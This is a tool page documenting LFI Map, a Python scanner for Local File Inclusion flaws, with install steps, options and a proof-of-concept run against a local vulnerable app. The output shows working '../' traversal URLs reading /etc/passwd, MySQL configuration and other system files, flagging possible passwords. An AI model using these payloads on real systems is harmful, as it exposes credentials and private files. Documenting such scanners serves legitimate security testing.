Description

A Local File Inclusion attack consists of exploiting a non-protected script on the server to read the content of another file, that is not initially intended/allowed by the application. For more information on that topic, see this page.

LFI Map is a Python script (written by Augusto Pereyra) that challenges web applications against Local File Inclusions (LFI) attacks. It is based on a set of directories that are injected in detected paramaters. Among others, here are some of the tool's features:

    Export the results in a HTML file
    Find the root of the file system automatically
    Find default files (linux and windows)
    Send null bytes to bypass some controls
    Detect passwords in files
    Support basic authentication
    Support proxy
    Detect OS and send only test according the OS detected
    Hex-encode URLs

Installation

$ wget http://lfimap.googlecode.com/files/lfimap-1.4.8.tar.gz
$ tar xvzf lfimap-1.4.8.tar.gz

Usage
Syntax

$ python lfimap.py -t <target> [options]

Options

--target, -t <target>
    Target. E.g. http://www.test.com/ss.php?page=[LFI HERE]

--null, -n
    Put a null byte to bypass some controls

--user, -u <user>
    Is used to send username in basic authentication

--passw, -p <password>
    Is used to send password in basic authentication

--proxy, -w <proxy>
    Proxy support

--output, -o <file>
    Set Output file

--hexa, -x
    Encode the url to hexa

Examples
Example #1: PoC
Description

The following example is based on a specific vulnerable code (download it here) that doesn't properly check/sanitize user inputs and is hence vulnerable to LFI attacks. LFIMap has been tested against this application as a Proof of Concept.
Stdout

LFIMap has been called with following parameters:

$ python lfimap.py -t "http://127.0.0.1/poc/LFI/index.php?page=page2.txt" -o report.html

Here is the output on the screen:

 lfi detected in "page" parameter
--------------------------------------------------------------------
Made by Augusto Pereyra
Thanks to www.artsweb.com.ar
This code is distributed under GPL Licence
Detecting root path of site
--------------------------------------------------------------------

Going down 0 folder
Going down 1 folder
Going down 2 folder
Going down 3 folder
Going down 4 folder
Going down 5 folder
root path finded in: 
-------------------------------------------------------------
http://127.0.0.1/poc/LFI/index.php?page=../../../../../&
 The root of the File system was found 6 levels down
 This is a Linux System
-------------------------------------------------------------
2011-02-03 06:52:45.401371
File Found: 
http://127.0.0.1/poc/LFI/index.php?page=../../../../../proc/version&
==============================================================
File Found: 
http://127.0.0.1/poc/LFI/index.php?page=../../../../../etc/apache2/apache2.conf&
==============================================================
File Found: 
http://127.0.0.1/poc/LFI/index.php?page=../../../../../etc/mysql/my.cnf&
Possible password detected in this file
==============================================================
File Found: 
http://127.0.0.1/poc/LFI/index.php?page=../../../../../etc/sysctl.conf&
==============================================================
File Found: 
http://127.0.0.1/poc/LFI/index.php?page=../../../../../etc/passwd&
==============================================================
File Found: 
http://127.0.0.1/poc/LFI/index.php?page=../../../../../etc/ts.conf&
==============================================================
File Found: 
http://127.0.0.1/poc/LFI/index.php?page=../../../../../etc/ca-certificates.conf&
==============================================================
File Found: 
http://127.0.0.1/poc/LFI/index.php?page=../../../../../etc/debconf.conf&
Possible password detected in this file
==============================================================
File Found: 
http://127.0.0.1/poc/LFI/index.php?page=../../../../../etc/bash_completion.d/debconf&
==============================================================
File Found: 
http://127.0.0.1/poc/LFI/index.php?page=../../../../../etc/xdg/user-dirs.conf&
==============================================================
File Found: 
http://127.0.0.1/poc/LFI/index.php?page=../../../../../etc/gnome-vfs-2.0/modules/default-modules.conf&
(...TRUNCATED...)

Generated report

Here is an extract of the generated html report:

Lfimap-generated-report-1.png
Proof of Concept

By clicking on one of the links from the generated html report, here is the proof of concept. We can see that the application is vulnerable to LFI attacks.

Lfimap-poc-1.png 
